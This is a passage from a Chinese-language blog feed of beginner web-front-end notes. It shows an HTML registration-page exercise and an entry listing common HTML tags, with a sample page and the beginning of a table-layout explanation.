class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">.logo &#123;</span></span><br><span class="line"><span class="undefined">float: left;</span></span><br><span class="line"><span class="undefined">width: 33%;</span></span><br><span class="line"><span class="undefined">height: 60px;</span></span><br><span class="line"><span class="undefined">border: 1px red solid;</span></span><br><span class="line"><span class="undefined">line-height: 60px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">.daohang &#123;</span></span><br><span class="line"><span class="undefined">float: left;</span></span><br><span class="line"><span class="undefined">border: 1px red solid;</span></span><br><span class="line"><span class="undefined">height: 100%;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">.amenu &#123;</span></span><br><span class="line"><span class="undefined">color: white;</span></span><br><span class="line"><span class="undefined">font-size: 20px;</span></span><br><span class="line"><span class="undefined">height: 40px;</span></span><br><span class="line"><span class="undefined">line-height: 40px;</span></span><br><span class="line"><span class="undefined">text-decoration: none;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">#logos &#123;</span></span><br><span class="line"><span class="undefined">line-height: 100%;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'logos'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'logo'</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/logo2.png"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'logo'</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/header.png"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'logo'</span> <span class="attr">style</span>=<span class="string">"text-align: center;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>登陆<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>购物车<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"blank"</span> <span class="attr">style</span>=<span class="string">"clear: both;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-color: black; height: 50px; text-align: center;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'daohang'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"amenu"</span>&gt;</span></span><br><span class="line">首页</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"amenu"</span>&gt;</span></span><br><span class="line">手机数码</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"amenu"</span>&gt;</span></span><br><span class="line">电脑办公</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"amenu"</span>&gt;</span></span><br><span class="line">电脑办公</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"amenu"</span>&gt;</span></span><br><span class="line">办公</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'daohang'</span> <span class="attr">style</span>=<span class="string">"line-height: 50px;height: 50px;position: right;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mui-input-row mui-search"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"search"</span> <span class="attr">class</span>=<span class="string">"mui-input-clear"</span> <span class="attr">placeholder</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">4</span> <span class="attr">color</span>=<span class="string">"white"</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background:url('./image/regist_bg.jpg '); width: 100%; height: 700px;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"myform"</span> <span class="attr">style</span>=<span class="string">"position :absolute; border: black solid 5px;left: 300px; top:200px ;width:700px;height: 480px;background-color: white ;padding: 50px;padding-left: 200px;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>   <span class="attr">width</span>=<span class="string">"60%"</span> <span class="attr">height</span>=<span class="string">"100%"</span>  <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"2"</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">5</span> <span class="attr">color</span>=<span class="string">"blue"</span> &gt;</span>会员注册<span class="tag">&lt;/<span class="name">font</span>&gt;</span>USER REGISTER<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">""</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>确认密码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">""</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"email"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>性别<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span>男</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span>女</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span>妖</span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>出生日期<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"date"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>验证码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"注册"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./img/footer.jpg"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">""</span> <span class="attr">style</span>=<span class="string">"text-align: center;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">copyright@xingqign</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> web前端 - </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web前端学习 - - </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html基础学习笔记</title>
      <link href="/2019/05/28/html5-xue-xi-table-bu-ju-bi-ji/"/>
      <url>/2019/05/28/html5-xue-xi-table-bu-ju-bi-ji/</url>
      
        <content type="html"><![CDATA[<h3 id="1-html的常用标签"><a href="#1-html的常用标签" class="headerlink" title="1. html的常用标签"></a>1. html的常用标签</h3><hr><p>常用标签：</p><ul><li><p>b : 加粗</p></li><li><p>i : 斜体</p></li><li><p>strong: 加粗, 带语义标签</p></li><li><p>em:  斜体, 带语义</p></li><li>p: 段落标签 </li><li><p>img:<br>常用的属性:</p><pre><code>- width : 宽度- height: 高度- src :  指定文件路径- alt:  图片加载失败时的提示内容</code></pre><p><strong>宽度设定，高度会自己进行一个合适的放缩，否则就会产生一个畸形的图片。宽度可以设置成百分比的形式。</strong></p></li><li><p>列表标签</p><ol><li>无序列表：ul<br>属性设置type:小圆圈,小圆点, 小方块</li><li>有序列表: ol<br>type: 1,a ,A,I,<br>start: 指定是起始索引</li><li>放置列表项目：li</li></ol></li><li><p>超链接标签a：</p><ol><li>href: 指定要跳转去的链接地址 ,如果是网络地址需要加上http协议 , 如果访问的是本网站的html文件,可以直接写文件路径</li><li>target: <ul><li>_self: 默认打开方式,在当前窗口打开</li><li>_blank:  新起一个标签页打开页面</li><li>[framename]: 指定哪个框架进行一个链接的跳转</li></ul></li></ol></li><li><p>字体标签font:</p><ol><li>color</li><li>size(1-7)超过7都会按照7显示</li><li>face 改变字体</li></ol></li><li>p 段落标签</li><li>h 标题标签 1-6</li><li>hr 水平线</li><li>table<br>属性： <ul><li>border: 指定边框</li><li>width : 宽度</li><li>height : 高度</li><li>bgcolor : 背景颜色</li><li>align : 水平对齐方式</li><li>vlign: 垂直对齐方式</li></ul></li><li>tr 行标签</li><li>td 单元格标签<br>属性：<ul><li>colspan: 跨行操作</li><li>rowspan:跨列操作</li></ul></li><li>br<br>是不能包裹住的，后面不能设置他的一个style，而<p>是包裹住，后面可以对标签进行一个样式设定。</p></li><li>frameset<br>如果使用frameset一定要将body标签去掉</li><li>frame</li><li><p>input：</p><ol><li>type:<ul><li>password</li><li>text</li><li>submit</li><li>button</li><li>reset</li><li>tel</li><li>number</li><li>radio： 单选按钮，需要将name设置相同的</li><li>hidden</li><li>checkbox: 复选按钮</li><li>date</li><li>email</li></ul></li></ol></li><li><p>select-option</p></li><li>textarea</li></ul><hr><p>一个简介的实例：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1. 上面是一个文档声明 </span></span><br><span class="line"><span class="comment">2. 根标签 html</span></span><br><span class="line"><span class="comment">3. html文件主要包含两部分. 头部分和体部分</span></span><br><span class="line"><span class="comment">头部分 : 主要是用来放置一些页面信息</span></span><br><span class="line"><span class="comment">体部分 : 主要来放置我们的HTML页面内容</span></span><br><span class="line"><span class="comment">4. 通过标签来对内容进行描述,标签通常都是由开始标签和结束标签组成  </span></span><br><span class="line"><span class="comment">5. 标签不区分大小写, 官方建议使用小写</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="comment">&lt;!-- 头去放置一些页面信息，体部分是页面内容 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"gbk"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定浏览器打开页面的编码方式 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 网站的配置信息 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 通过标签对内容进行描述 &lt;br/&gt;是一个空标签</span></span><br><span class="line"><span class="comment">标签不区分大小写</span></span><br><span class="line"><span class="comment">他是一个解释性的语言</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>入门案例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 浏览器会帮我们去整理 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>公司简介<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="comment">&lt;!-- h是1到6 ,如果不是就超出了范围就按照正常的显示 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span><span class="comment">&lt;!-- 水平分割线 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>中国<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>ssx<span class="tag">&lt;<span class="name">em</span>&gt;</span>asdasdasdasdasdas<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- font的大小范围为0-7 --&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">7</span> <span class="attr">face</span>=<span class="string">blackadder</span> <span class="attr">itc</span> <span class="attr">color</span>=<span class="string">"blue"</span>&gt;</span>中国<span class="tag">&lt;/<span class="name">font</span>&gt;</span>ssxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>asdasdasdas<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>asasasasasasasasasasasasasasasas<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- src指定图片路径 </span></span><br><span class="line"><span class="comment">width自己设置,高度会随着width进行一个自我调整</span></span><br><span class="line"><span class="comment">alt:在文件加载失败时候的提示下.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>haasas<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>haasas<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>haasas<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>haasas<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">square</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>haasas<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>haasas<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>haasas<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>haasas<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span>hahahah<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">disc</span>&gt;</span>友情链接</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>谷歌<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>百合<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>世纪佳缘<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> &gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- em和i都是斜体</span></span><br><span class="line"><span class="comment">    b加粗,i是斜体,\</span></span><br><span class="line"><span class="comment">strong也是加粗,带有语义的标签</span></span><br><span class="line"><span class="comment">em:斜体,带有语义,搜索引擎友好的.</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-使用表格进行一个页面的布局"><a href="#2-使用表格进行一个页面的布局" class="headerlink" title="2. 使用表格进行一个页面的布局"></a>2. 使用表格进行一个页面的布局</h3><h4 id="2-1-表格的嵌套以及跨行跨列"><a href="#2-1-表格的嵌套以及跨行跨列" class="headerlink" title="2.1 表格的嵌套以及跨行跨列"></a>2.1 表格的嵌套以及跨行跨列</h4><p>colspan跨列，rowspan是跨列</p><hr><p>首先分析一共需要几行几列：创建八行一列的表格</p><h6 id="第一部分：logo部分，嵌套一个一行三列的表格"><a href="#第一部分：logo部分，嵌套一个一行三列的表格" class="headerlink" title="第一部分：logo部分，嵌套一个一行三列的表格"></a>第一部分：logo部分，嵌套一个一行三列的表格</h6><h6 id="第二部分：导航栏部分，只用放置5个超链接"><a href="#第二部分：导航栏部分，只用放置5个超链接" class="headerlink" title="第二部分：导航栏部分，只用放置5个超链接"></a>第二部分：导航栏部分，只用放置5个超链接</h6><h6 id="第三部分：轮播图"><a href="#第三部分：轮播图" class="headerlink" title="第三部分：轮播图"></a>第三部分：轮播图</h6><h6 id="第四部分：嵌套一个表格：三行其七个列，"><a href="#第四部分：嵌套一个表格：三行其七个列，" class="headerlink" title="第四部分：嵌套一个表格：三行其七个列，"></a>第四部分：嵌套一个表格：三行其七个列，</h6><h6 id="第五部分-放一张图片"><a href="#第五部分-放一张图片" class="headerlink" title="第五部分:放一张图片"></a>第五部分:放一张图片</h6><h6 id="第六：抄第四部分"><a href="#第六：抄第四部分" class="headerlink" title="第六：抄第四部分"></a>第六：抄第四部分</h6><h6 id="第七部分：放置一张图片"><a href="#第七部分：放置一张图片" class="headerlink" title="第七部分：放置一张图片"></a>第七部分：放置一张图片</h6><h6 id="第八部分：放置超链接"><a href="#第八部分：放置超链接" class="headerlink" title="第八部分：放置超链接"></a>第八部分：放置超链接</h6><p>表格布局的一些技巧：</p><p>table常用属性：<br>1、border 定义表格的边框</p><p>2、cellpadding 定义单元格内内容与边框的距离</p><p>3、cellspacing 定义单元格与单元格之间的距离</p><p>4、align 设置单元格中内容的水平对齐方式,设置值有：left | center | right</p><p>5、valign 设置单元格中内容的垂直对齐方式 top | middle | bottom</p><p>6、colspan 设置单元格水平合并</p><p>7、rowspan 